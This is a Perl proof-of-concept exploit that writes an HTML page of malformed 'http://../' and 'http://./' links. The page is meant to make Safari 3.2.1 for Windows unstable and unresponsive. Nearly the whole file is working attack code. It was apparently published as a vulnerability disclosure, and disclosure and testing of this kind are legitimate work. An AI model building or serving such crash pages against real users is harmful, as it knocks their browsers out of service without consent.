# !/usr/bin/perl
# Safari_httpDoSPoc.pl
# Safari for Windows 3.2.1 Remote http: uri handler DoS
# Lostmon [Lostmon@gmail.com ]
#[http://lostmon.blogspot.com]


$archivo = $ARGV[0];
if(!defined($archivo))
{

print "Uso: $0 <archivo.html>\n";

}

$cabecera = "<html><Title> Safari 3.2.1 for windows Browser Die PoC By Lostmon</title>
<body>" . "\n";
$codigo = "<h3>Safari 3.2.1 for windows Browser Die PoC By Lostmon <br>(lostmon@gmail.com) http://lostmon.blogspot.com</h3>
<P>This PoC is a malformed http URI, this causes that safari for windows<br>
turn inestable and unresponsive.<br>
Click THIS link.=></p><a href=\"http://../\">Safari Die()</a> or this other =><a href=\"http://./\">Safari Die()</a>
";
$piepag = "</body></html>";

$datos = $cabecera . $codigo . $piepag;

open(FILE, '>' . $archivo);
print FILE $datos;
close(FILE);

exit;